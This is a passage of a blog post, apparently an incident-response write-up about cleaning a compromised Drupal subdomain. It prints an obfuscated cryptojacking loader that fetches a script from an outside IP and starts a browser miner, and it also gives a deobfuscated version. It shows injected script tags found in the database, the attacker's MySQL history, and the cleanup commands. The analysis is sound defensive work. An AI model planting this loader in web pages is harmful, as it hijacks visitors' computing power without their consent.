</span></span><span style="display:flex;"><span>var _0x17e1=[&#34;script&#34;,&#34;createElement&#34;,&#34;type&#34;,&#34;text/javascript&#34;,&#34;readyState&#34;,&#34;onreadystatechange&#34;,&#34;loaded&#34;,&#34;complete&#34;,&#34;onload&#34;,&#34;src&#34;,&#34;appendChild&#34;,&#34;head&#34;,
</span></span><span style="display:flex;"><span>&#34;getElementsByTagName&#34;,&#34;http://146.185.234.113/hhY6.js&#34;,&#34;undefined&#34;,&#34;stop&#34;,&#34;_client&#34;,&#34;56bc34061cd882609aab5de9d411b6e12be622137090334aa0697591bd8c7742&#34;,&#34;start&#34;];
</span></span><span style="display:flex;"><span>function loadScript(_0x17a8x2,_0x17a8x3){var _0x17a8x4=document[_0x17e1[1]](_0x17e1[0]);_0x17a8x4[_0x17e1[2]]= _0x17e1[3];if(_0x17a8x4[_0x17e1[4]])
</span></span><span style="display:flex;"><span>{_0x17a8x4[_0x17e1[5]]= function(){if(_0x17a8x4[_0x17e1[4]]== _0x17e1[6]|| _0x17a8x4[_0x17e1[4]]== _0x17e1[7]){_0x17a8x4[_0x17e1[5]]= null;_0x17a8x3()}}}
</span></span><span style="display:flex;"><span>else {_0x17a8x4[_0x17e1[8]]= function(){_0x17a8x3()}};_0x17a8x4[_0x17e1[9]]= _0x17a8x2;document[_0x17e1[12]](_0x17e1[11])[0][_0x17e1[10]](_0x17a8x4)}
</span></span><span style="display:flex;"><span>loadScript(_0x17e1[13],function(){setTimeout(function(){if( typeof (miner)!= _0x17e1[14]){try{miner[_0x17e1[15]]()}catch(e){}};if( typeof (_client)!=
</span></span><span style="display:flex;"><span>_0x17e1[14]){try{_client[_0x17e1[15]]()}catch(e){}};document[_0x17e1[16]]=  new
</span></span><span style="display:flex;"><span>Client.Anonymous(_0x17e1[17],{throttle:0.3});document[_0x17e1[16]][_0x17e1[18]](Client.FORCE_MULTI_TAB)},1000)})
</span></span></code></pre></div><p>A cleaner version would be:</p>
<pre tabindex="0"><code>var _0x17e1=
[&#34;script&#34;,
&#34;createElement&#34;,
&#34;Type&#34;,
&#34;text/javascript&#34;,
&#34;readyState&#34;,
&#34;Onreadystatechange&#34;,
&#34;Loaded&#34;,
&#34;Complete&#34;,
&#34;Onload&#34;,
&#34;Src&#34;,
&#34;appendChild&#34;,
&#34;Head&#34;,
&#34;getElementsByTagName&#34;,
&#34;http://146.185.234.113/hhY6.js&#34;,
&#34;Undefined&#34;,
&#34;Stop&#34;,
&#34;_client&#34;,
&#34;56bc34061cd882609aab5de9d411b6e12be622137090334aa0697591bd8c7742&#34;,
&#34;Start&#34;];
function loadScript(_0x17a8x2,_0x17a8x3){
  var _0x17a8x4 = document[_0x17e1[1]](_0x17e1[0]);
  _0x17a8x4[_0x17e1[2]] = _0x17e1[3];
if(_0x17a8x4[_0x17e1[4]]){
  _0x17a8x4[_0x17e1[5]] = function(){
    if(_0x17a8x4[_0x17e1[4]] == _0x17e1[6] || _0x17a8x4[_0x17e1[4]] == _0x17e1[7]){
      _0x17a8x4[_0x17e1[5]] = null;_0x17a8x3()}}}else {_0x17a8x4[_0x17e1[8]]= function(){_0x17a8x3()}};_0x17a8x4[_0x17e1[9]]= _0x17a8x2;document[_0x17e1[12]](_0x17e1[11])[0][_0x17e1[10]](_0x17a8x4)}loadScript(_0x17e1[13],function(){setTimeout(function(){if( typeof (miner)!= _0x17e1[14]){try{miner[_0x17e1[15]]()}catch(e){}};if( typeof (_client)!= _0x17e1[14]){try{_client[_0x17e1[15]]()}catch(e){}};document[_0x17e1[16]]=  new Client.Anonymous(_0x17e1[17],{throttle:0.3});document[_0x17e1[16]][_0x17e1[18]](Client.FORCE_MULTI_TAB)},1000)})
</code></pre><p>So, this link fetches some malicious script to load hhY6.js. We tried to translate the loadScript functions.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;script&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;createElement&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;type&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;text/javascript&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;readyState&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;onreadystatechange&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;loaded&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;complete&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;onload&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;src&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;appendChild&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;head&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;getElementsByTagName&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">13</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://146.185.234.113/hhY6.js&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">14</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;undefined&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">15</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;stop&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;_client&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;56bc34061cd882609aab5de9d411b6e12be622137090334aa0697591bd8c7742&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">18</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;start&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">loadScript</span>(<span style="color:#a6e22e">_0x17a8x2</span>,<span style="color:#a6e22e">_0x17a8x3</span>){
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x17a8x4</span> <span style="color:#f92672">=</span> document[<span style="color:#e6db74">&#34;createElement&#34;</span>](<span style="color:#e6db74">&#34;script&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">_0x17a8x4</span>[<span style="color:#e6db74">&#34;type&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;text/javascript&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">_0x17a8x4</span>[<span style="color:#e6db74">&#34;readyState&#34;</span>]){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_0x17a8x4</span>[<span style="color:#e6db74">&#34;onreadystatechange&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(){
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">_0x17a8x4</span>[<span style="color:#e6db74">&#34;readyState&#34;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;loaded&#34;</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">_0x17a8x4</span>[<span style="color:#e6db74">&#34;readyState&#34;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;complete&#34;</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">_0x17a8x4</span>[<span style="color:#e6db74">&#34;onreadystatechange&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">_0x17a8x3</span>()
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_0x17a8x4</span>[<span style="color:#e6db74">&#34;onload&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(){
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">_0x17a8x3</span>()
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  };
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">_0x17a8x4</span>[<span style="color:#e6db74">&#34;src&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x17a8x2</span>;
</span></span><span style="display:flex;"><span>  document[<span style="color:#e6db74">&#34;getElementsByTagName&#34;</span>](<span style="color:#e6db74">&#34;head&#34;</span>)[<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#34;appendChild&#34;</span>](<span style="color:#a6e22e">_0x17a8x4</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">loadScript</span>(<span style="color:#e6db74">&#34;http://146.185.234.113/hhY6.js&#34;</span>,<span style="color:#66d9ef">function</span>(){
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">function</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>( <span style="color:#66d9ef">typeof</span> (<span style="color:#a6e22e">miner</span>)<span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;undefined&#34;</span>){
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">try</span>{<span style="color:#a6e22e">miner</span>[<span style="color:#e6db74">&#34;stop&#34;</span>]()}
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){}
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>( <span style="color:#66d9ef">typeof</span> (<span style="color:#a6e22e">_client</span>)<span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;undefined&#34;</span>){
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">try</span>{<span style="color:#a6e22e">_client</span>[<span style="color:#e6db74">&#34;stop&#34;</span>]()}
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){}
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>    document[<span style="color:#e6db74">&#34;_client&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Client</span>.<span style="color:#a6e22e">Anonymous</span>(<span style="color:#e6db74">&#34;56bc34061cd882609aab5de9d411b6e12be622137090334aa0697591bd8c7742&#34;</span>,{<span style="color:#a6e22e">throttle</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0.3</span>});
</span></span><span style="display:flex;"><span>    document[<span style="color:#e6db74">&#34;_client&#34;</span>][<span style="color:#e6db74">&#34;start&#34;</span>](<span style="color:#a6e22e">Client</span>.<span style="color:#a6e22e">FORCE_MULTI_TAB</span>)
</span></span><span style="display:flex;"><span>  },<span style="color:#ae81ff">1000</span>)
</span></span><span style="display:flex;"><span>})
</span></span></code></pre></div><p>This script is trying to load more cryptojacking scripts. It has a similar resemblance to: <a class="link" href="https://coinhive.com/documentation/miner"  target="_blank" rel="noopener"
    >https://coinhive.com/documentation/miner</a></p>
<h3 id="mysql-database-lookup">MySQL Database Lookup
</h3><p>Drupal uses MySQL database to load HTML content from modules. The hidden malicious javascript code (found in HTML) is injected in a MySQL table: block_custom in database: subdomainsite</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>|   8 | &lt;script type=&#34;text/javascript&#34; src=&#34;https://wt-23afbbf05d73a701c3ef54b49e4de14c-0.sandbox.auth0-extend.com/full-http-control&#34;&gt;&lt;/script&gt;
</span></span><span style="display:flex;"><span>| drupal update | php_code |
</span></span><span style="display:flex;"><span>|   9 | &lt;script type=&#34;text/javascript&#34; src=&#34;https://wt-23afbbf05d73a701c3ef54b49e4de14c-0.sandbox.auth0-extend.com/full-http-control&#34;&gt;&lt;/script&gt;
</span></span><span style="display:flex;"><span>| drupal updater | full_html |
</span></span></code></pre></div><p>Looks like these rows are forcing the site to load the cryptojacking scripts. Hence, we clean up these rows from MySQL:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>mysql&gt; delete from block_custom where bid=8;
</span></span><span style="display:flex;"><span>Query OK, 1 row affected (0.05 sec)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>mysql&gt; delete from block_custom where bid=9;
</span></span><span style="display:flex;"><span>Query OK, 1 row affected (0.03 sec)
</span></span></code></pre></div><p>After deleting the rows, the footer code disappears, thus removing the malware from loading on the page.</p>
<p>Also, when looking at MySQL command history:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>user@host:/var/www/subdomain$ cat ~/.mysql_history
</span></span><span style="display:flex;"><span>show databases;
</span></span><span style="display:flex;"><span>use subdomainsite;
</span></span><span style="display:flex;"><span>show tales;
</span></span><span style="display:flex;"><span>show tables;
</span></span><span style="display:flex;"><span>select column from users;
</span></span><span style="display:flex;"><span>select * from users;
</span></span><span style="display:flex;"><span>show cloumns from users;
</span></span><span style="display:flex;"><span>show columns from users;
</span></span><span style="display:flex;"><span>select mail from users;
</span></span><span style="display:flex;"><span>show databases;
</span></span><span style="display:flex;"><span>use subdomainsite;
</span></span><span style="display:flex;"><span>select * from users;
</span></span><span style="display:flex;"><span>show columns from users;
</span></span><span style="display:flex;"><span>select * from users where mail like &#39;@drupaler%&#39;;
</span></span><span style="display:flex;"><span>select * from users where mail like &#39;%@drupaler%&#39;;
</span></span><span style="display:flex;"><span>delete from users where mail like &#39;%@drupaler%&#39;;
</span></span><span style="display:flex;"><span>select mail from users;
</span></span><span style="display:flex;"><span>show databases;
</span></span><span style="display:flex;"><span>use subdomainsite;
</span></span><span style="display:flex;"><span>select mail from users;
</span></span><span style="display:flex;"><span>select * from users where mail like &#39;%brainhard%&#39;;
</span></span><span style="display:flex;"><span>delete from users where mail like &#39;%brainhard%&#39;;
</span></span><span style="display:flex;"><span>select mail from users;
</span></span><span style="display:flex;"><span>delete from users where mail like &#39;%bee@addmyhome.com%&#39;;
</span></span><span style="display:flex;"><span>delete from users where mail like &#39;%canie.assassins-creed.org%&#39;;
</span></span><span style="display:flex;"><span>delete from users where mail like &#39;%quinn.adkins38@visitnorwayusa.com%&#39;;
</span></span><span style="display:flex;"><span>delete from users where mail like &#39;%menherbalenhancement.com%&#39;;
</span></span><span style="display:flex;"><span>show databases;
</span></span><span style="display:flex;"><span>use WordPressDB;
</span></span><span style="display:flex;"><span>show tables;
</span></span><span style="display:flex;"><span>describe wp_posts;
</span></span><span style="display:flex;"><span>select * from wp_posts;
</span></span><span style="display:flex;"><span>describe wp_posts;
</span></span><span style="display:flex;"><span>show databases;
</span></span><span style="display:flex;"><span>use subdomainsite;
</span></span><span style="display:flex;"><span>select mail from users;
</span></span><span style="display:flex;"><span>select * from users where mail like &#39;%@drupaler%&#39;;
</span></span><span style="display:flex;"><span>select * from users where mail like &#39;%drupaler%&#39;;
</span></span><span style="display:flex;"><span>select * from users where mail like &#39;%drupal%&#39;;
</span></span><span style="display:flex;"><span>select mail from users where mail like &#39;%drupal%&#39;;
</span></span><span style="display:flex;"><span>delete from users where mail like &#39;%drupal%&#39;;
</span></span><span style="display:flex;"><span>select mail from users;
</span></span><span style="display:flex;"><span>use subdomainsite;
</span></span><span style="display:flex;"><span>select mail from users;
</span></span><span style="display:flex;"><span>show databases;
</span></span><span style="display:flex;"><span>use WordPressDB;
</span></span><span style="display:flex;"><span>show tables;
</span></span><span style="display:flex;"><span>describe wp_users;
</span></span><span style="display:flex;"><span>select * from wp_users; …
</span></span></code></pre></div><p>Seems like they tried to delete their spamming email domains: <a class="link" href="https://www.pozzo-balbi.com/help/List_of_email_spamming_domains"  target="_blank" rel="noopener"
    >https://www.pozzo-balbi.com/help/List_of_email_spamming_domains</a></p>
<p>Now, the webshell IRC connections and phishing activities stopped!</p>
<p>CAUSE: The current Drupal version (running on the webserver) has a vulnerability for XSS attacks. This was confirmed with grabber vulnerability scanner tool.
SOLUTION: Possible solution is to patch the Drupal system, but since we are not using the subdomain website, we can shutdown that domain.</p>
<h3 id="cleaning-up">Cleaning Up
</h3><p>Since we are not using the subdomain site, we shut it down:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$vim /etc/apache2/sites-available/default-ssl.conf
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>   #&lt;VirtualHost _default_:443&gt;
</span></span><span style="display:flex;"><span>    #    ServerAdmin admin@email.ca
</span></span><span style="display:flex;"><span>    #    ServerName  subdomain.website.ca
</span></span><span style="display:flex;"><span>    #    # Indexes + Directory Root.
</span></span><span style="display:flex;"><span>    #    DirectoryIndex index.php
</span></span><span style="display:flex;"><span>    #    DocumentRoot /var/www/subdomain/
</span></span><span style="display:flex;"><span>    # …
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>$sudo service apache2 restart
</span></span></code></pre></div><p>For safety purposes, we block SMTP Port and stop the mail service:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>sudo iptables -A INPUT -i eth0 -p tcp --destination-port 25 -j DROP
</span></span><span style="display:flex;"><span>sudo /etc/init.d/postfix stop
</span></span></code></pre></div>
</section>


    <footer class="article-footer">
    

    </footer>


    
</article>

    

    

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2025 My Personal Site
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.4b9f5c771e24cda3bdaebdb72ee7db26536a1438035fd46d9c68730a2052c5b3.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
